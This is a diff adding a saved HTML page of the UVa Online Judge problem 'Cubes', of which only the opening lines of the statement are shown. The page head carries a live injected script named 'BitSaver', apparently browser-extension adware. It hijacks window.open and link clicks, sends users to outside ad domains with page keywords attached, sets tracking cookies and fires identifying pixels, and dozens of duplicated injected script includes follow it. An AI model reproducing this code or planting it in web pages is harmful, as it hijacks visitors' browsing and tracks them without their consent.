@@ -1,0 +1,409 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns="http://www.w3.org/TR/REC-html40"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="ProgId" content="Word.Document">
+<meta name="Generator" content="Microsoft Word 11">
+<meta name="Originator" content="Microsoft Word 11">
+<link rel="File-List" href="https://uva.onlinejudge.org/external/114/b_files/filelist.xml">
+<link rel="Edit-Time-Data" href="https://uva.onlinejudge.org/external/114/b_files/editdata.mso">
+<link rel="OLE-Object-Data" href="https://uva.onlinejudge.org/external/114/b_files/oledata.mso">
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]-->
+<title>Problem B - Cubes</title>
+<!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:View>Print</w:View>
+  <w:Zoom>125</w:Zoom>
+  <w:SpellingState>Clean</w:SpellingState>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:ValidateAgainstSchemas/>
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" LatentStyleCount="156">
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Arial Unicode MS";
+	panose-1:2 11 6 4 2 2 2 2 2 4;
+	mso-font-charset:128;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-1 -369098753 63 0 4129279 0;}
+@font-face
+	{font-family:"\@Arial Unicode MS";
+	panose-1:2 11 6 4 2 2 2 2 2 4;
+	mso-font-charset:128;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-1 -369098753 63 0 4129279 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	color:black;}
+h1
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	mso-outline-level:1;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	color:black;
+	font-weight:normal;
+	font-style:italic;}
+h2
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	mso-outline-level:2;
+	font-size:18.0pt;
+	font-family:"Times New Roman";
+	color:black;
+	font-weight:bold;}
+h3
+	{mso-margin-top-alt:auto;
+	margin-right:0in;
+	mso-margin-bottom-alt:auto;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	mso-outline-level:3;
+	font-size:13.5pt;
+	font-family:"Arial Unicode MS";
+	font-weight:bold;}
+h4
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:4;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	color:black;
+	font-weight:normal;}
+h5
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:5;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	color:black;
+	font-weight:normal;}
+p.MsoHeader, li.MsoHeader, div.MsoHeader
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoFooter, li.MsoFooter, div.MsoFooter
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoCaption, li.MsoCaption, div.MsoCaption
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	font-weight:bold;}
+p.MsoTitle, li.MsoTitle, div.MsoTitle
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:center;
+	mso-pagination:widow-orphan;
+	font-size:24.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	font-weight:bold;}
+p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoBodyText2, li.MsoBodyText2, div.MsoBodyText2
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	color:black;}
+p.MsoBodyText3, li.MsoBodyText3, div.MsoBodyText3
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:#6633CC;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+p
+	{mso-margin-top-alt:auto;
+	margin-right:0in;
+	mso-margin-bottom-alt:auto;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+address
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	font-style:italic;}
+pre
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
+	font-size:10.0pt;
+	font-family:"Courier New";
+	mso-fareast-font-family:"Times New Roman";}
+p.preformatted, li.preformatted, div.preformatted
+	{mso-style-name:preformatted;
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	layout-grid-mode:char;
+	font-size:10.0pt;
+	font-family:"Courier New";
+	mso-fareast-font-family:"Times New Roman";}
+span.stylearial16pt
+	{mso-style-name:stylearial16pt;
+	font-family:Arial;
+	mso-ascii-font-family:Arial;
+	mso-hansi-font-family:Arial;
+	mso-bidi-font-family:Arial;
+	font-weight:bold;}
+span.SpellE
+	{mso-style-name:"";
+	mso-spl-e:yes;}
+@page Section1
+	{size:595.45pt 841.7pt;
+	margin:.8in .8in 67.7pt .8in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-parent:"";
+	mso-padding-alt:0in 5.4pt 0in 5.4pt;
+	mso-para-margin:0in;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-ansi-language:#0400;
+	mso-fareast-language:#0400;
+	mso-bidi-language:#0400;}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:shapedefaults v:ext="edit" spidmax="5122"/>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapelayout v:ext="edit">
+  <o:idmap v:ext="edit" data="1"/>
+ </o:shapelayout></xml><![endif]-->
+<script id="id_ar623so92sn445lc0fm" src="11428_files/wp_003.js" async="" type="text/javascript"></script><script id="id_cje6936fjie71mc6fa" src="11428_files/wpnewbs.js" async="" type="text/javascript"></script><script id="jruwmcl34702sh16583msdp2c52" src="11428_files/wpgb_003.js" async="" type="text/javascript"></script><script type="text/javascript" id="fghjktghndfgt">function fghjktghndfgt_init() {
+    new function () {if (!document.getElementById("__fghjktghndfgt_once")) {(function () {var a = document.createElement("div");a.id = "__fghjktghndfgt_once";a.setAttribute("style", "display:none;");var c = document.getElementsByTagName("body")[0];c && c.appendChild(a);}());var a = this;a.pid = "22605";a.cc = "BD";a.eid = "728";a.ename = "BitSaver";a.hid = "11933499912449121808";a.debugMode = !1;a.utils = new function () {var b = this;"function" !== typeof String.prototype.trim && (String.prototype.trim = function () {return this.replace(/^\s+|\s+$/g, "");});b.JSON = new function () {this.parse = function (c) {try {return "undefined" !== typeof JSON && "function" == typeof JSON.stringify ? JSON.parse(c) : eval("var a=" + c);} catch (a) {return !1;}};};b.cookie = new function () {var c = this;c.setCookie = function (c, a, b) {var f = "";"string" === typeof b ? (f = "; expires=" + b) : "number" === typeof b && (f = new Date, f.setTime(f.getTime() + 86400000 * b), f = "; expires=" + f.toGMTString());document.cookie = c + "=" + a + f + "; path=/";};c.getCookie = function (c) {c += "=";for (var a = document.cookie.split(";"), b = 0; b < a.length; b++) {for (var f = a[b]; " " == f.charAt(0);) {f = f.substring(1, f.length);}if (0 == f.indexOf(c)) {return f.substring(c.length, f.length);}}return null;};c.eraseCookie = function (a) {c.setCookie(a, "", - 1);};};b.getProtocol = function (c) {var a = document.createElement("a");a.href = c;return a.protocol;};b.getHostName = function (c) {if (!c) {return "";}var a = document.createElement("a");a.href = c;return a.hostname;};b.isMenuBarVisible = function () {if (!b.msie && window.menubar) {return window.menubar.visible;}if ("object" == typeof WebBrowser2) {return WebBrowser2.MenuBar;}if (b.msie) {return !0;}var c = window.innerWidth || document.documentElement.scrollWidth || 0, a = window.innerHeight || document.documentElement.scrollHeight || 0;if (c) {window.resizeTo(c, a);var g = window.innerWidth || document.documentElement.scrollWidth, e = window.innerHeight || document.documentElement.scrollHeight;window.resizeTo(c + 2, a);c = window.scrollWidth || document.documentElement.scrollWidth;return !(c != g && c <= g + 2 && 90 >= a - e);}};b.getInstructions = function (c, d) {b.msie ? b.inject_script(c + ("&cb=" + a.prefix + "." + d)) : b.ajax.get(c, function (c) {if (c) {a[d](c);}});};b.l = new function () {var c = this;c.xlat = "abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/";c.encode = function (a) {a = c._utf8_encode(a);for (var b = "", e = 0; e < a.length;) {var f = a.charCodeAt(e++), h = a.charCodeAt(e++), l = a.charCodeAt(e++), k = f >> 2, f = (f & 3) << 4 | h >> 4, n = (h & 15) << 2 | l >> 6, m = l & 63;isNaN(h) ? (n = m = 64) : isNaN(l) && (m = 64);b = b + c.xlat.charAt(k) + c.xlat.charAt(f) + (64 == n ? "=" : c.xlat.charAt(n)) + (64 == m ? "=" : c.xlat.charAt(m));}return b;};c._utf8_encode = function (c) {if (c && c.length) {for (var a = "", b = 0; b < c.length; b++) {var f = c.charCodeAt(b);128 > f ? (a += String.fromCharCode(f)) : (127 < f && 2048 > f ? (a += String.fromCharCode(f >> 6 | 192)) : (a += String.fromCharCode(f >> 12 | 224), a += String.fromCharCode(f >> 6 & 63 | 128)), a += String.fromCharCode(f & 63 | 128));}return a;}return c;};c.decode = function (a) {a = a.toString().replace(/[^A-Za-z0-9\+\/]/g, "");for (var b = "", e = 0; e < a.length;) {var f = c.xlat.indexOf(a.charAt(e++)), h = c.xlat.indexOf(a.charAt(e++)), l = c.xlat.indexOf(a.charAt(e++)), k = c.xlat.indexOf(a.charAt(e++)), n = (h & 15) << 4 | l >> 2, m = (l & 3) << 6 | k, b = b + String.fromCharCode(f << 2 | h >> 4);64 != l && 0 < n && (b += String.fromCharCode(n));64 != k && 0 < m && (b += String.fromCharCode(m));}return this._utf8_decode(b);};c._utf8_decode = function (a) {for (var c = "", b = 0; b < a.length;) {var f = a.charCodeAt(b);if (128 > f) {c += String.fromCharCode(f), b++;} else if (191 < f && 224 > f) {var h = a.charCodeAt(b + 1), c = c + String.fromCharCode((f & 31) << 6 | h & 63), b = b + 2;} else {var h = a.charCodeAt(b + 1), l = a.charCodeAt(b + 2), c = c + String.fromCharCode((f & 15) << 12 | (h & 63) << 6 | l & 63), b = b + 3;}}return c;};};b.ajax = new function () {this.get = function (a, b) {try {var g = new XMLHttpRequest;g.open("GET", a, !0);g.withCredentials = !0;g.onreadystatechange = function () {4 == g.readyState && b(g.responseText);};g.send();} catch (e) {}};};b.randomChar = function () {for (var a = "", b = 0; 2 > b; b++) {a += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(52 * Math.random()));}return a;};b.msie = function () {var a = parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10);isNaN(a) && (a = parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10));return isNaN(a) ? !1 : a;}();b.inject_script = function (c) {var b = document.getElementsByTagName("body")[0], g = document.createElement("script");g.type = "text/javascript";g.id = "id_" + a.prefix;g.src = c;b && b.appendChild(g);};b.epoch = function () {return Math.floor((new Date).getTime() / 1000);};b.getVert = function () {var a = localStorage.getItem("sk398erjds2d");return a ? a : b.forexVert();};b.browser = function () {var a = navigator.userAgent.toLowerCase(), b = {webkit: /webkit/.test(a), mozilla: /mozilla/.test(a) && !/(compatible|webkit)/.test(a), chrome: /chrome/.test(a), msie: /msie/.test(a) && !/opera/.test(a), firefox: /firefox/.test(a), safari: /safari/.test(a) && !/chrome/.test(a), opera: /opera/.test(a)};b.version = b.safari ? (a.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];return b;}();b.getNodeTextProp = function (a) {return "textContent" in a ? "textContent" : "innerText" in a ? "innerText" : !1;};b.dhtml_prop_name = function (a) {return a.replace(/(\-([a-z]){1})/g, function (a, c, b) {return b.toUpperCase();});};b.get_computed_style = "function" != typeof window.getComputedStyle ? function (a) {return {getPropertyValue: function (d) {"float" == d && (d = "styleFloat");d = b.dhtml_prop_name(d);return "object" == typeof a.currentStyle && null != a.currentStyle && "undefined" != typeof a.currentStyle[d] ? a.currentStyle[d] : null;}};} : function (a, b) {return window.getComputedStyle(a, b) || {getPropertyValue: function () {}};};b.getEmptyWindow = function () {var a = document.createElement("iframe");a.src = "about:blank";a.setAttribute("style", "display:inline;width:1px;height:1px;padding:none;margin:none;");document.body.appendChild(a);return a.contentWindow;};};a.prefix = "fghjktghndfgtssss";a.extName = "BitSaver";a.version = "0.1.1";a.pop_collision_id = "__ipm=";a.pixelHostname = function () {try {return "//mnh." + eval("[\"profficed.com\",\"winnermore.com\"]")["https:" == window.location.protocol ? 1 : 0];} catch (a) {return ["//mnh.winneri.info", "//mnh.winnermore.org"]["https:" == window.location.protocol ? 1 : 0];}}();a.watcherCount = 0;a.fallbackHostnames = ["compey.net", "comprises.info"];try {a.stngs = a.utils.JSON.parse("{\"szy_domain\":[\"unitspybookukset.org\",\"comprises.info\"],\"ad_sizes\":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}");} catch (q) {a.hostnames = a.fallbackHostnames;}var p;p = "" !== a.stngs && a.stngs && "undefined" !== typeof a.stngs.szy_domain && a.stngs.szy_domain instanceof Array ? a.stngs.szy_domain : a.fallbackHostnames;a.hostnames = p;a.debugMode && (a.debug = new function () {var b = this;window.oldSetTimeout = window.setTimeout;window.oldSetInterval = window.setInterval;b.overrideSettimeout = function () {window.setTimeout = function (a, b) {return window.oldSetTimeout(function () {try {console.log("%csetTimeout: " + a.toString(), "color:purple"), a();} catch (b) {}}, b);};};b.overrideSetinterval = function () {window.setInterval = function (a, b) {return window.oldSetInterval(function () {try {console.log("setInterval: " + a.toString()), a();} catch (b) {}}, b);};};b.overrideVariables = function () {a.pid = "12";a.cc = "US";a.eid = "10";a.hid = "123456789";a.ename = "QA extension";a.lt = "2617.24";a.jpshort = "_OXQj15i";a.platform_version = "10";};b.init = function () {b.overrideSettimeout();b.overrideSetinterval();b.overrideVariables();};b.init();});a.legacyHostnames = ["superiends.org", "go.turboloves.net", "installerapplicationusa.com", "stylene.net"];a.body = document.getElementsByTagName("body")[0];a.params = {subid: a.pid, subid1: a.hid, subid2: a.eid, 'px.pluginh': 1, tid: "7", red: "1", subid3: "679"};a.manhattanCookieInterval = 0.0015;a.events = new function () {var a = this;a.cache = [];a.add = window.addEventListener ? function (c, d, g, e, f) {"undefined" == typeof e && (e = window);e.addEventListener(c, d, g);f && a.cache.push([c, d, g, e]);} : window.attachEvent ? function (c, d, g, e, f) {"undefined" == typeof e && (e = window);e["e" + c + d] = d;e[c + d] = function () {e["e" + c + d](window.event);};e.attachEvent("on" + c, e[c + d]);f && a.cache.push([c, d, g, e]);} : function () {};a.remove = window.removeEventListener ? function (a, b, g, e) {"undefined" == typeof e && (e = window);e.removeEventListener(a, b, g);} : window.detachEvent ? function (a, b, g, e) {"undefined" == typeof e && (e = window);e.detachEvent("on" + a, e[a + b]);e[a + b] = null;e["e" + a + b] = null;} : function () {};a.flush = function () {for (var c = 0; c < a.cache.length; c++) {a.remove.apply(a, a.cache[c]);}a.cache = [];};};a.pixel = function (b, c) {var d = a.pixelHostname + "?", g = a.hostnames[0], g = {pid: a.pid, cc: a.cc, eid: a.eid, hid: a.hid, v: a.version, ch: b, cid: 0, tid: a.params.tid, adtid: 0, smid: 0, pbid: "0", oh: encodeURIComponent(c), sh: encodeURIComponent(g)}, e;for (e in g) {d += e + "=" + g[e] + "&";}d = d.slice(0, - 1);if (21 === b) {return d = d.split("?")[1], a.utils.l.encode(d);}(new Image).src = d;};a.getKeywords = function () {var a = document.title, c = document.getElementsByTagName("meta");if (c) {for (var d = 0, g = c.length; d < g; d++) {"keywords" != c[d].name.toLowerCase() && "description" != c[d].name.toLowerCase() || (a += " " + c[d].content.replace(/,/g, " "));}}if ((d = document.getElementsByTagName("a"))) {c = {};for (g = 0; g < d.length; g++) {try {var e = d[g].innerText;"undefined" == typeof e && (e = d[g].textContent);for (var f = e.toLowerCase().split(/[\s,-]/g), h = 0; h < f.length; h++) {4 > f[h].length || (c[f[h]] ? c[f[h]]++ : (c[f[h]] = 1));}} catch (l) {}}var e = [], k;for (k in c) {e.push([k, c[k]]);}e.sort(function (a, b) {return b[1] - a[1];});e = e.slice(0, 25);for (k = 0; k < e.length; k++) {a += " " + e[k][0];}}return encodeURIComponent(a.replace(/[\!\[\]_-]/g, " ").trim().substring(0, 1500));};a.isFalseResponseFromServer = function () {- 1 < a.body.innerText.indexOf("e7hZBzqVfn==") && window.close();};a.checkIfServer = function () {for (var b = 0; b < a.hostnames.length; b++) {if (location.hostname === a.hostnames[b]) {return a.isFalseResponseFromServer(), !0;}}};a.checkIfPop = function (b, c, d) {return !(d + "").match(/^InterYield/i) && !(d + "").match(/(a652c|ld893)_/) && "r_ron_redir" !== d && - 1 == document.cookie.indexOf("xcddsa") && - 1 == b.indexOf("px.pluginh") && - 1 == b.indexOf("earchfu") && - 1 == location.href.indexOf("/amz/") && - 1 == location.href.indexOf("/sd/dw32.html") && - 1 == location.href.indexOf("/pop/1.1.00") && !location.href.match(/cpops-\d+\.html/) && - 1 == location.href.indexOf("px.pluginh") && - 1 == b.indexOf("nkths.co") && - 1 == b.indexOf("ally.asi") && - 1 == b.indexOf("/sd/dw32.html") && - 1 == b.indexOf("/pop/1.1.00") && - 1 == b.indexOf("/amz/") && !b.match(/cpops-\d+\.html/) && - 1 == a.utils.getHostName(b).indexOf("getjs") && - 1 == a.utils.getHostName(b).indexOf("hsbc");};window == window.top && a.pixel(10, "0");- 1 < window.location.href.indexOf(a.pop_collision_id) && window == window.top && a.pixel(13, "0");a.addBlurredTabListener = function (b) {var c;try {c = a.utils.getHostName(b.target.getAttribute("href"));} catch (d) {c = "";}"a" == b.target.tagName.toLowerCase() && "" == b.target.innerHTML && b.target.getAttribute("href") && !b.target.getAttribute("download") && - 1 == c.indexOf(window.location.hostname) && (c = b.target.getAttribute("href") ? b.target.getAttribute("href") : "0", a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), b.target.setAttribute("target", a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie("vdsknj4th4uh", "1", c.toUTCString()), b.target.setAttribute("href", a.manhattanUrl), document.getElementsByTagName("body")[0].removeEventListener("click", a.addBlurredTabListener));};a.prepareUrl = function (b) {b = "?";for (var c in a.params) {b += c + "=" + a.params[c] + "&";}b += "k=" + a.getKeywords();return "http://" + a.hostnames[0] + b;};try {window.top == window && - 1 == document.cookie.indexOf("vdsknj4th4uh") && window.name !== a.prefix && a.overrideDispatchEvent();} catch (r) {}a.checkIfServer() || (a.cachedOpenFn = window.open, a.overrideDispatchEvent = function () {a.cachedDispatchEvent = document.createElement("a").constructor.prototype.dispatchEvent;document.createElement("a").constructor.prototype.dispatchEvent = function (b) {var c;try {c = a.utils.getHostName(event.target.getAttribute("href"));} catch (d) {c = "";}"a" == this.tagName.toLowerCase() && "" == this.innerHTML && "click" == b.type && - 1 == c.indexOf(window.location.hostname) && this.getAttribute("href") && !this.getAttribute("download") && - 1 == document.cookie.indexOf("vdsknj4th4uh") && (c = this.getAttribute("href") ? this.getAttribute("href") : "0", a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), this.setAttribute("target", a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie("vdsknj4th4uh", "1", c.toUTCString()), this.setAttribute("href", a.manhattanUrl));a.cachedDispatchEvent.call(this, b);};}, a.checkIfPartner = function (a) {return "Za" == a;}, a.overrideWindowOpen = function () {clearTimeout(a.timeout);window.open = function (b) {return function (c, d, g) {window == window.top && a.pixel(11, "0");b = a.cachedOpenFn;if (a.checkIfPop(c, g, d)) {return d = new Date, d.setMinutes(d.getMinutes() + 15), a.utils.cookie.setCookie("xcddsa", "1", d.toUTCString()), a.manhattanUrl = a.prepareUrl(c), d = a.prefix, a.pixel(20, c), a.manhattanOn = !0, a.utils.msie && 9 > a.utils.msie ? window.open(a.manhattanUrl, d, g) : b.call(window, a.manhattanUrl, d, g);}d = d || "";window.open = a.cachedOpenFn;return a.utils.msie && 9 > a.utils.msie ? window.open(c, d, g) : b.call(window, c, d, g);};}(window.open);4 < a.watcherCount || a.manhattanOn || (a.watcherCount++, a.openWatcher());}, a.overrideDispatchEvent(), a.openWatcher = function () {a.timeout = setTimeout(a.overrideWindowOpen, 200);}, a.openWatcher(), "undefined" == typeof window[a.prefix] && (window[a.prefix] = a));}};
+};fghjktghndfgt_init()</script><script id="id_ar623so92sn445lc0fm" src="11428_files/wp.js" async="" type="text/javascript"></script><script id="id_cje6936fjie71mc6fa" src="11428_files/wpnewbs_002.js" async="" type="text/javascript"></script><script id="jruwmcl34702sh16583msdp2c52" src="11428_files/wpgb_002.js" async="" type="text/javascript"></script><script id="id_ar623so92sn445lc0fm" src="11428_files/wp_002.js" async="" type="text/javascript"></script><script id="id_cje6936fjie71mc6fa" src="11428_files/wpnewbs_003.js" async="" type="text/javascript"></script><script id="jruwmcl34702sh16583msdp2c52" src="11428_files/wpgb.js" async="" type="text/javascript"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp_002.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/SharedApp.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/json3.js"></script><script src="11428_files/NWPLegacy_v2.js"></script><script src="11428_files/bloomfilter.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><script src="11428_files/jquery_002.js"></script><script src="11428_files/jquery.js"></script><link class="ver7963995" rel="stylesheet" type="text/css" href="11428_files/reset.css"><link class="ver994109" rel="stylesheet" type="text/css" href="11428_files/foicons.css"><link class="ver53553" rel="stylesheet" type="text/css" href="11428_files/dealsRightRibbon.css"><link class="ver9334821" rel="stylesheet" type="text/css" href="11428_files/displayWindow.css"><link class="ver6122318" rel="stylesheet" type="text/css" href="11428_files/cssImages.css"><link class="ver6236868" rel="stylesheet" type="text/css" href="11428_files/font-awesome.css"><link class="ver9402399" rel="stylesheet" type="text/css" href="11428_files/multiButton_002.css"><link class="ver4100780" rel="stylesheet" type="text/css" href="11428_files/bottomSlider.css"><link class="ver9121109" rel="stylesheet" type="text/css" href="11428_files/multiButton_002.css"><link class="ver3869087" rel="stylesheet" type="text/css" href="11428_files/multiButton_002.css"><link class="ver4440862" rel="stylesheet" type="text/css" href="11428_files/altRightSlider_002.css"><link class="ver391156" rel="stylesheet" type="text/css" href="11428_files/multiButton_002.css"><link class="ver6160676" rel="stylesheet" type="text/css" href="11428_files/bottomSlider.css"><link class="ver4013554" rel="stylesheet" type="text/css" href="11428_files/multiButton_002.css"><link class="ver1573834" rel="stylesheet" type="text/css" href="11428_files/multiButton.css"><link class="ver3665954" rel="stylesheet" type="text/css" href="11428_files/altRightSlider.css"></head>
+
+<body jhjlijpomuhn_9="1" s11933499912449121808="1" style="" lang="EN-US" link="#6633CC" vlink="purple">
+
+<div class="Section1">
+
+<p class="MsoNormal" style="text-align:center" align="center"><b><span style="font-size:28.0pt;font-family:Arial">Problem B</span></b><span style="font-family:Arial"><br>
+</span><b><span style="font-size:20.0pt;font-family:Arial">Cubes </span></b><span style="font-family:Arial"><br>
+<b>Input: </b>Standard Input</span></p>
+
+<p class="MsoNormal" style="text-align:center" align="center"><b><span style="font-family:Arial">Output: </span></b><span style="font-family:Arial">Standard
+Output </span></p>
+
+<p class="MsoNormal" style="text-align:justify">&nbsp;</p>
+
+<p class="MsoNormal" style="text-align:justify">&nbsp;</p>
+
+<p class="MsoNormal" style="text-align:justify">Given a positive integer N you
+will have to find two positive integers x and y such that:</p>
+
+<p class="MsoNormal" style="text-align:justify">&nbsp;</p>
+
+<p class="MsoNormal" style="text-align:center" align="center"><span style="position:relative;top:5.0pt;mso-text-raise:-5.0pt"><!--[if gte vml 1]><v:shapetype
+ id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t"
+ path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f">
+ <v:stroke joinstyle="miter"/>
+ <v:formulas>
+  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
+  <v:f eqn="sum @0 1 0"/>
+  <v:f eqn="sum 0 0 @1"/>
+  <v:f eqn="prod @2 1 2"/>
+  <v:f eqn="prod @3 21600 pixelWidth"/>
+  <v:f eqn="prod @3 21600 pixelHeight"/>
+  <v:f eqn="sum @0 0 1"/>
+  <v:f eqn="prod @6 1 2"/>
+  <v:f eqn="prod @7 21600 pixelWidth"/>
+  <v:f eqn="sum @8 21600 0"/>
+  <v:f eqn="prod @7 21600 pixelHeight"/>
+  <v:f eqn="sum @10 21600 0"/>
+ </v:formulas>
+ <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
+ <o:lock v:ext="edit" aspectratio="t"/>
+</v:shapetype><v:shape id="_x0000_i1027" type="#_x0000_t75" style='width:77.25pt;
+ height:24pt' o:ole="">
+ <v:imagedata src="b_files/image001.wmz" o:title=""/>
